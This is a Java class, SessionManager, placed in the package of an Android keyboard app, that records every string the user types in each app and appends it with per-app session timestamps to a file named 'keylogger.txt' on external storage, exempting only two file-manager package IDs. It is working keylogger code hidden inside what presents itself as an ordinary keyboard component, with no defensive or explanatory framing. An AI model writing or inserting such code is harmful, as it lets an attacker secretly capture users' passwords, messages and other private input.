package com.anysoftkeyboard;

import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.ArrayList;

import android.util.Log;

public class SessionManager
{
    private static final DateFormat DATE_FORMAT = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
    private static final int MAX_LENGTH_OF_STRING = 20;
    private Date StartSessionDateTime;
    private Date CurrentSessionDateTime;
    private Date EndSessionDateTime;

    private String typedString;
    private String AppPackageId;
    private ArrayList ForbiddenStates;

    private FileOutputStream outFileStream;

    public class CurrentStringManager
    {
        public CurrentStringManager()
        {

        }
    }
    public static DateFormat getDateFormat() {
        return DATE_FORMAT;
    }

    public static int getMaxLengthOfString() {
        return MAX_LENGTH_OF_STRING;
    }

    public Date getStartSessionDateTime() {
        return StartSessionDateTime;
    }

    public void setStartSessionDateTime(Date startSessionDateTime)
    {
        StartSessionDateTime = startSessionDateTime;
    }

    public Date getCurrentSessionDateTime() {
        return CurrentSessionDateTime;
    }

    public void setCurrentSessionDateTime(Date currentSessionDateTime) {
        CurrentSessionDateTime = currentSessionDateTime;
    }

    public Date getEndSessionDateTime() {
        return EndSessionDateTime;
    }

    public void setEndSessionDateTime(Date endSessionDateTime) {
        EndSessionDateTime = endSessionDateTime;
    }

    public String getTypedString() {
        return typedString;
    }

    public void setTypedString(String typedString) {
        this.typedString = typedString;
    }

    public String getAppPackageId()
    {
        return AppPackageId;
    }

    public void setAppPackageId(String appPackageId)
    {
        AppPackageId = appPackageId;
    }

    public ArrayList getForbiddenStates()
    {
        return ForbiddenStates;
    }

    public void AddForbiddenState(String forbiddenState)
    {
        if (getForbiddenStates() == null){
            ForbiddenStates = new ArrayList<String>();
        }
        if ((forbiddenState != null) && (!forbiddenState.equals("")))
        {
            getForbiddenStates().add(forbiddenState);
        }
    }

    public FileOutputStream getOutFileStream()
    {
        return outFileStream;
    }

    public void setOutFileStream(FileOutputStream outFile)
    {
        this.outFileStream = outFile;
    }

    public SessionManager(String AppPackageId)
    {
        setTypedString("");
        AddForbiddenState("com.rhmsoft.edit");
        AddForbiddenState("filemanager.FileBrowser.cpcorp.com");
        setAppPackageId(AppPackageId);
        for (Object forbiddenState : getForbiddenStates()) {
            if (getAppPackageId().equals(forbiddenState)) return;
        }
        CreateOrOpenFile();
        Date currentDate = new Date();
        setStartSessionDateTime(currentDate);
        setCurrentSessionDateTime(currentDate);
        CreatedOpenedNewSessionLog();
    }

    public void CreatedOpenedNewSessionLog()
    {
        String dateStr = getDateFormat().format(getStartSessionDateTime());
        String SessionMsg=String.format("[Starting new session on app: %s ; Date: %s ]\n",getAppPackageId(),dateStr);
        writeString(SessionMsg);
    }

    public void CreatedEndCurrentSessionLog()
    {
        String dateStr = getDateFormat().format(getEndSessionDateTime());
        String SessionMsg=String.format("[Ending current session on app: %s ; Date: %s ]\n",getAppPackageId(),dateStr);
        writeString(SessionMsg);
    }

    public void deleteLastChar()
    {
        if (this.typedString.length()>0)
        {
            this.typedString=typedString.substring(0,this.typedString.length()-1);
        }
    }

    public void Destroy()
    {
        writeString(getTypedString()+"\n");
        Date currentDate = new Date();
        setEndSessionDateTime(currentDate);
        setCurrentSessionDateTime(currentDate);
        CreatedEndCurrentSessionLog();
        CloseFile();
    }

    //FIX THIS
    public void handleString(String writeStr)
    {
        this.setTypedString(getTypedString()+writeStr);
        if (this.getTypedString().length()>getMaxLengthOfString()){
            writeString(this.getTypedString());
            this.setTypedString("");
        }
    }

    public void writeString(String writeStr)
    {
        try {
            this.getOutFileStream().write(writeStr.getBytes());
        }
        catch(Exception e)
        {
            Log.d("EXCEPTION",e.getMessage());
        }
    }

    public void CreateOrOpenFile()
    {
        String SDCARD;
        try
        {
            SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
            String FILENAME = "keylogger.txt";
            File outfile = new File(SDCARD+File.separator+FILENAME);
            this.setOutFileStream(new FileOutputStream(outfile,true));
        }
        catch(Exception e)
        {
            Log.d("EXCEPTION",e.getMessage());
        }
    }

    public void CloseFile()
    {
        String SDCARD;
        try
        {
            this.getOutFileStream().close();
        }
        catch(Exception e)
        {
            Log.d("EXCEPTION",e.getMessage());
        }
    }
}

